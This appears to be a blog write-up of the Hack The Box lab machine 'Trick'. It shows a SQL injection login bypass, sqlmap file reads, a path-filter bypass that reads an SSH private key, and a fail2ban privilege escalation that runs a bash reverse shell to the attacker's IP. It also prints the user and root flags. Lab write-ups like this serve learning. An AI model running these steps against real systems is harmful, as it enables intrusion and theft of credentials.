---
title: "Trick from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Trick from HTB
`nmap`gave this:
```bash
nmap -sCV --min-rate 4000 -Pn -p- 10.10.11.166
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-15 18:19 +04
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.60% done
Nmap scan report for 10.10.11.166
Host is up (0.088s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid:
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
With `53`port open we can use `dig`to get `site name and maybe also subdomains`
```bash
dig @10.10.11.166 axfr trick.htb
------------
----------------
preprod-payroll.trick.htb. 604800 IN	CNAME	trick.htb.
trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5
---------------
--------------
```
Add both of them to `/etc/hosts`
```
10.10.11.166 trick.htb preprod-payroll.trick.htb
```
Then go to `preprod-payroll.trick.htb`
This site is vulnerable to `sql injections`which we can see in login page
If you type this: `username---> admin' or 1=1 -- - password---> 1
You will get logged in. Then go to `sqlmap`and read what privileges you have with:
```
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=admin&password=admin" -p username --privileges
```
This will display:
```
[19:04:03] [INFO] adjusting time delay to 3 seconds due to good response times
'ramo'@'localhost'
[19:08:47] [INFO] fetching number of privileges for user 'remo'
[19:08:47] [INFO] retrieved: 1
[19:08:56] [INFO] fetching privileges for user 'remo'
[19:08:56] [INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
   privilege: FILE
```
This means you can read `files`
Then
```bash
sqlmap -u http://preprod-payroll.trick.htb/ajax.php?action=login --data="username=admin&password=help" -p username --file-read=/etc/nginx/sites-enabled/default --technique=BEU --batch --level 5 --risk 3 --threads 10
```
With this you will see all the `subdomains`that this site has.
Then read the file that it says for me it was:
```
/home/giorgi/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default
```
Reading that told me that there is an `preprod-marketing.trick.htb`subdomain. Add that to `/etc/hosts`
```
10.10.11.166 trick.htb preprod-marketing.trick.htb
```
For easier way `you could've used ffuf like this preprod-FUZZ.trick.htb` and you would discover this subdomain.
Go to that subdomain and you can see that this subdomain is more vulnerable to `LFI`
If you try to read `/etc/passwd`you can't with `../../../etc/passwd`because site filters this.
it should be like this `....//....//....//etc/passwd`. So basically when you try to read files out of that directory it filters and removes `../`. So if you want to read file in upper directory you will need to double type.
```
/index.php?page=....//....//....//....//....//....///etc/passwd
```
One thing is you should've used `smtp port`to upload `php cmd`but when you can read `id_rsa`file and connect to `ssh`easily you will not need that.
With `/etc/passwd`file you get that `michael`is an user. that you will connect to.
```
/index.php?page=....//....//....//....//....//....//home/michael/.ssh/id_rsa
```
with this you will get `ssh key`
Connect to ssh
***
User Flag is: 91501b7e264f89030af7e348ce858c47
***
```bash
sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```
Then go and search `fail2ban privilege escalation`
I found this site: https://juggernaut-sec.com/fail2ban-lpe/
I changed it a bit
```bash
cd /etc/fail2ban/action.d
mv iptables-multiport.conf whatever
cp whatever iptables-multiport.conf
```
Then change the last line to this:
```
actionban = /tmp/shell.sh
```
Then go to `/tmp`and create `shell.sh`
In `shell.sh`type:
```bash
#!/bin/bash
bash -i >& /dev/tcp/<your_IP>/<port> 0>&1
```
Save it and go to other terminal.
Try to connect to `ssh`but this time type `wrong password`to get banned by `fail2ban`
```bash
ssh michael@trick.htb
michael@trick.htb's password:
Permission denied, please try again.
michael@trick.htb's password:
Permission denied, please try again.
michael@trick.htb's password:
michael@trick.htb: Permission denied (publickey,password).
.................

.....................
...................
..........................
 ssh michael@trick.htb
ssh: connect to host trick.htb port 22: Connection refused
```
After lot of tries, finally i get `banned`
Then in my `netcat` i set up i get connection where i'm root.
***
Root Flag is: 74a66f08c30f51d742c4246bde0a388f
***
![](/assets/images/Screenshot from 2024-08-15 20-10-30.png)
